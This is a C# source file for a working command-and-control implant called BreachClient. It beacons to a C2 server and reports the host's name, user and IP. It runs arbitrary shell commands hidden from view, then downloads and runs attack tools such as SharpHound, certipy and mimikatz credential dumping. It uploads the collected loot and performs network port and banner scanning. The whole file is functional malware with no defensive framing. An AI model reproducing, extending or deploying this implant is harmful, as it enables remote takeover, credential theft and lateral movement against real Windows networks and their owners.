using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace BreachClient
{
    class Program
    {
        private static readonly HttpClient http = new HttpClient();
        private static readonly string ServerId = "http://192.168.10.4:8080";
        private static readonly string AgentId = Guid.NewGuid().ToString();
        private static readonly int BeaconInterval = 5000; // ms

        static async Task Main(string[] args)
        {
            while (true)
            {
                try
                {
                    await Checkin();
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[-] Beacon error: {e.Message}");
                }

                await Task.Delay(BeaconInterval);
            }
        }

        static string GetLocalIP()
        {
            try
            {
                using var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                socket.Connect("8.8.8.8", 65530);
                return ((IPEndPoint)socket.LocalEndPoint!).Address.ToString();
            }
            catch { return ""; }
        }

        static async Task Checkin()
        {
            var payload = JsonSerializer.Serialize(new
            {
                agent_id = AgentId,
                hostname = Environment.MachineName,
                username = Environment.UserName,
                ip       = GetLocalIP()
            });

            var response = await http.PostAsync(
                $"{ServerId}/checkin",
                new StringContent(payload, Encoding.UTF8, "application/json")
            );

            var body = await response.Content.ReadAsStringAsync();
            var doc = JsonDocument.Parse(body).RootElement;

            if (doc.TryGetProperty("task_id", out var taskIdEl) &&
                taskIdEl.ValueKind != JsonValueKind.Null)
            {
                int taskId = taskIdEl.GetInt32();
                string taskType   = doc.GetProperty("task_type").GetString()!;
                string instruction = doc.GetProperty("instruction").GetString()!;

                string output = taskType switch
                {
                    "recon"       => await RunRecon(instruction),
                    "sharphound"  => await RunSharpHound(instruction),
                    "certipy"     => await RunCertipy(instruction),
                    "secretsdump" => await RunDownloadAndExec(instruction),
                    "dpapi"       => await RunDownloadAndExec(instruction),
                    _             => ExecuteCommand(instruction)
                };

                await PostResult(taskId, output);
            }
        }

        // ── Shell execution ───────────────────────────────────────────────────

        static string ExecuteCommand(string instruction)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName               = "cmd.exe",
                    Arguments              = $"/c {instruction}",
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };

                using var proc = Process.Start(psi)!;
                string stdout = proc.StandardOutput.ReadToEnd();
                string stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                return string.IsNullOrWhiteSpace(stderr) ? stdout : stdout + "\n[stderr] " + stderr;
            }
            catch (Exception e)
            {
                return $"[exec error] {e.Message}";
            }
        }

        // ── Tool download / upload helpers ────────────────────────────────────

        /// <summary>Download a tool from /files/<toolName> and save it to %TEMP%.</summary>
        static async Task<string?> DownloadTool(string toolName)
        {
            try
            {
                var resp = await http.GetAsync($"{ServerId}/files/{toolName}");
                if (!resp.IsSuccessStatusCode)
                    return null;

                string dest = Path.Combine(Path.GetTempPath(), toolName);
                var bytes = await resp.Content.ReadAsByteArrayAsync();
                await File.WriteAllBytesAsync(dest, bytes);
                return dest;
            }
            catch
            {
                return null;
            }
        }

        /// <summary>Upload a file from the agent back to the server's /upload endpoint.</summary>
        static async Task UploadFile(string filePath)
        {
            try
            {
                using var form = new MultipartFormDataContent();
                form.Add(new StringContent(AgentId), "agent_id");

                var bytes = await File.ReadAllBytesAsync(filePath);
                form.Add(new ByteArrayContent(bytes), "file", Path.GetFileName(filePath));

                await http.PostAsync($"{ServerId}/upload", form);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Upload failed: {e.Message}");
            }
        }

        // ── SharpHound module ─────────────────────────────────────────────────

        /// <summary>
        /// Download SharpHound.exe from the server, run it in a temp working directory,
        /// upload any ZIP files it produces back to the server, then return stdout.
        ///
        /// Instruction: SharpHound CLI args (e.g. "-d ICCN.LOCAL --CollectionMethods All")
        /// Leave empty to use SharpHound defaults.
        /// </summary>
        static async Task<string> RunSharpHound(string args)
        {
            string? toolPath = await DownloadTool("SharpHound.exe");
            if (toolPath == null)
                return "[error] Failed to download SharpHound.exe from server";

            // Run in a dedicated temp directory so ZIP output is easy to find
            string workDir = Path.Combine(Path.GetTempPath(), "sh_" + Guid.NewGuid().ToString("N")[..8]);
            Directory.CreateDirectory(workDir);

            string shPath = Path.Combine(workDir, "SharpHound.exe");
            File.Copy(toolPath, shPath, overwrite: true);

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName               = shPath,
                    Arguments              = string.IsNullOrWhiteSpace(args) ? "--zipfilename loot" : args,
                    WorkingDirectory       = workDir,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };

                using var proc = Process.Start(psi)!;
                string stdout = proc.StandardOutput.ReadToEnd();
                string stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                // Upload every ZIP SharpHound produced
                var zips = Directory.GetFiles(workDir, "*.zip");
                foreach (var zip in zips)
                    await UploadFile(zip);

                string result = string.IsNullOrWhiteSpace(stderr)
                    ? stdout
                    : stdout + "\n[stderr] " + stderr;

                return result.Trim() + $"\n[+] Uploaded {zips.Length} ZIP file(s) to server";
            }
            finally
            {
                try { Directory.Delete(workDir, recursive: true); } catch { }
            }
        }

        // ── Certipy module (ADCS enumeration) ────────────────────────────────

        /// <summary>
        /// Download certipy.exe from the server, run it in a temp working directory,
        /// upload any output files it produces (.json, .txt, .zip), then return stdout.
        ///
        /// Instruction: certipy subcommand + args
        ///   e.g. "find -u administrator@corp.local -p Password123 -dc-ip 10.0.0.1"
        ///        "find -u administrator@corp.local -hashes :aad3b435b51404eeaad3b435b51404ee:... -dc-ip 10.0.0.1"
        /// </summary>
        static async Task<string> RunCertipy(string args)
        {
            string? toolPath = await DownloadTool("certipy.exe");
            if (toolPath == null)
                return "[error] Failed to download certipy.exe from server";

            string workDir = Path.Combine(Path.GetTempPath(), "cp_" + Guid.NewGuid().ToString("N")[..8]);
            Directory.CreateDirectory(workDir);

            string cpPath = Path.Combine(workDir, "certipy.exe");
            File.Copy(toolPath, cpPath, overwrite: true);

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName               = cpPath,
                    Arguments              = args,
                    WorkingDirectory       = workDir,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };

                using var proc = Process.Start(psi)!;
                string stdout = proc.StandardOutput.ReadToEnd();
                string stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                // Upload all output files certipy produced (.json, .txt, .zip)
                var outputFiles = Directory.GetFiles(workDir)
                    .Where(f => !f.EndsWith("certipy.exe", StringComparison.OrdinalIgnoreCase))
                    .ToArray();
                foreach (var f in outputFiles)
                    await UploadFile(f);

                string result = string.IsNullOrWhiteSpace(stderr)
                    ? stdout
                    : stdout + "\n[stderr] " + stderr;

                return result.Trim() + $"\n[+] Uploaded {outputFiles.Length} output file(s) to server";
            }
            finally
            {
                try { Directory.Delete(workDir, recursive: true); } catch { }
            }
        }

        // ── Generic tool execution (secretsdump, dpapi, …) ───────────────────

        /// <summary>
        /// Download a tool from /files/ and run it. The instruction format is:
        ///   "toolname.exe [args...]"
        /// The first token is the filename to download; the rest are passed as arguments.
        ///
        /// Examples:
        ///   "mimikatz.exe sekurlsa::logonpasswords exit"
        ///   "SharpDPAPI.exe triage"
        /// </summary>
        static async Task<string> RunDownloadAndExec(string instruction)
        {
            var parts    = instruction.Split(' ', 2, StringSplitOptions.RemoveEmptyEntries);
            string tool  = parts[0];
            string tArgs = parts.Length > 1 ? parts[1] : "";

            string? toolPath = await DownloadTool(tool);
            if (toolPath == null)
                return $"[error] Failed to download {tool} from server";

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName               = toolPath,
                    Arguments              = tArgs,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };

                using var proc = Process.Start(psi)!;
                string stdout = proc.StandardOutput.ReadToEnd();
                string stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                return string.IsNullOrWhiteSpace(stderr) ? stdout : stdout + "\n[stderr] " + stderr;
            }
            catch (Exception e)
            {
                return $"[exec error] {e.Message}";
            }
        }

        // ── Lateral movement (disabled — re-enable when BH integration is ready) ──
        //
        // static async Task<string> RunLateralMovement(string instruction)
        // {
        //     // Planned: parse BloodHound-derived action (e.g. ChangePassword, AddMember)
        //     // and execute via native Windows commands or downloaded tooling.
        //     // instruction format TBD once Graph Logic Engine is built.
        //     return "[disabled] Lateral movement module not yet enabled";
        // }

        // ── Recon engine ──────────────────────────────────────────────────────

        static readonly int[] CommonPorts = { 21, 22, 23, 25, 80, 135, 139, 443, 445, 3389, 5985, 5986, 8080, 8443 };
        static readonly int PingTimeout   = 1000; // ms
        static readonly int PortTimeout   = 500;  // ms
        static readonly int BannerTimeout = 1000; // ms

        static async Task<string> RunRecon(string target)
        {
            var ips = ExpandTarget(target);

            // Parallel ping sweep
            var pingTasks = ips.Select(ip => PingHostAsync(ip)).ToArray();
            await Task.WhenAll(pingTasks);

            var aliveHosts = ips
                .Zip(pingTasks, (ip, t) => (ip, alive: t.Result))
                .Where(x => x.alive)
                .Select(x => x.ip)
                .ToList();

            // Scan alive hosts in parallel: hostname + port/service/banner
            var hosts = aliveHosts.AsParallel().Select(ip =>
            {
                string hostname = ResolveHostname(ip);
                var ports = CommonPorts
                    .Select(p => ScanPort(ip, p))
                    .Where(r => r.HasValue)
                    .Select(r => new { port = r!.Value.port, service = r.Value.service, banner = r.Value.banner })
                    .ToList();
                return new { ip, hostname, ports };
            }).ToList();

            string json = JsonSerializer.Serialize(new { target, hosts });

            // Write to a temp file and upload to loot
            string fileName = $"recon_{DateTime.UtcNow:yyyyMMdd_HHmmss}.json";
            string tempPath = Path.Combine(Path.GetTempPath(), fileName);
            try
            {
                await File.WriteAllTextAsync(tempPath, json);
                await UploadFile(tempPath);
            }
            finally
            {
                try { File.Delete(tempPath); } catch { }
            }

            return json;
        }

        static string ResolveHostname(string ip)
        {
            try
            {
                var entry = Dns.GetHostEntry(ip);
                return entry.HostName;
            }
            catch { return ""; }
        }

        static (int port, string service, string banner)? ScanPort(string ip, int port)
        {
            try
            {
                using var tcp = new TcpClient();
                var ar = tcp.BeginConnect(ip, port, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(PortTimeout)) return null;
                try { tcp.EndConnect(ar); } catch { return null; }

                string banner  = GrabBanner(tcp, ip, port);
                string service = GetServiceName(port, banner);
                return (port, service, banner);
            }
            catch { return null; }
        }

        static string GrabBanner(TcpClient tcp, string ip, int port)
        {
            // Skip banner grab for binary/SSL protocols
            if (port == 135 || port == 139 || port == 443 || port == 3389 || port == 5986 || port == 8443)
                return "";
            try
            {
                tcp.ReceiveTimeout = BannerTimeout;
                var stream = tcp.GetStream();
                stream.WriteTimeout = BannerTimeout;

                if (port == 80 || port == 8080)
                {
                    var req = Encoding.ASCII.GetBytes($"HEAD / HTTP/1.0\r\nHost: {ip}\r\n\r\n");
                    stream.Write(req, 0, req.Length);
                }

                var buf = new byte[512];
                int n = stream.Read(buf, 0, buf.Length);
                return new string(Encoding.ASCII.GetString(buf, 0, n)
                    .Where(c => c >= 32 || c == '\n' || c == '\r')
                    .ToArray()).Trim();
            }
            catch { return ""; }
        }

        static string GetServiceName(int port, string banner)
        {
            if (banner.StartsWith("SSH-"))
                return $"SSH ({banner.Split('\n')[0].Trim()})";
            if (banner.StartsWith("220") && port == 21)
                return $"FTP ({banner.Split('\n')[0].Trim()})";
            if (banner.StartsWith("220") && port == 25)
                return $"SMTP ({banner.Split('\n')[0].Trim()})";
            if (banner.StartsWith("HTTP/") || banner.Contains("Server:"))
            {
                var srv = banner.Split('\n').FirstOrDefault(l => l.StartsWith("Server:"));
                return srv != null ? $"HTTP ({srv[7..].Trim()})" : "HTTP";
            }
            if (banner.StartsWith("230") || banner.StartsWith("331")) return "FTP";
            if (banner.StartsWith("+OK")) return "POP3";

            return port switch
            {
                21   => "FTP",
                22   => "SSH",
                23   => "Telnet",
                25   => "SMTP",
                80   => "HTTP",
                135  => "MSRPC",
                139  => "NetBIOS",
                443  => "HTTPS",
                445  => "SMB",
                3389 => "RDP",
                5985 => "WinRM-HTTP",
                5986 => "WinRM-HTTPS",
                8080 => "HTTP-Alt",
                8443 => "HTTPS-Alt",
                _    => "unknown"
            };
        }

        static List<string> ExpandTarget(string target)
        {
            var ips = new List<string>();

            if (target.Contains('/'))
            {
                var parts  = target.Split('/');
                int prefix = int.Parse(parts[1]);
                var baseIp = IPAddress.Parse(parts[0]);
                byte[] bytes = baseIp.GetAddressBytes();

                if (prefix < 8 || prefix > 30)
                    return ips;

                uint ipInt    = (uint)(bytes[0] << 24 | bytes[1] << 16 | bytes[2] << 8 | bytes[3]);
                uint mask      = prefix == 0 ? 0 : 0xFFFFFFFF << (32 - prefix);
                uint network   = ipInt & mask;
                uint broadcast = network | ~mask;

                for (uint i = network + 1; i < broadcast; i++)
                {
                    byte[] b = new byte[4];
                    b[0] = (byte)(i >> 24);
                    b[1] = (byte)(i >> 16);
                    b[2] = (byte)(i >> 8);
                    b[3] = (byte)(i);
                    ips.Add(new IPAddress(b).ToString());
                }
            }
            else
            {
                ips.Add(target);
            }

            return ips;
        }

        static async Task<bool> PingHostAsync(string ip)
        {
            try
            {
                using var ping = new Ping();
                var reply = await ping.SendPingAsync(ip, PingTimeout);
                return reply.Status == IPStatus.Success;
            }
            catch
            {
                return false;
            }
        }

        // ── Result posting ────────────────────────────────────────────────────

        static async Task PostResult(int taskId, string output)
        {
            var payload = JsonSerializer.Serialize(new
            {
                task_id  = taskId,
                agent_id = AgentId,
                output   = output
            });

            var response = await http.PostAsync(
                $"{ServerId}/result",
                new StringContent(payload, Encoding.UTF8, "application/json")
            );

            if (!response.IsSuccessStatusCode)
                Console.WriteLine($"[-] Failed to post result: {response.StatusCode}");
        }
    }
}
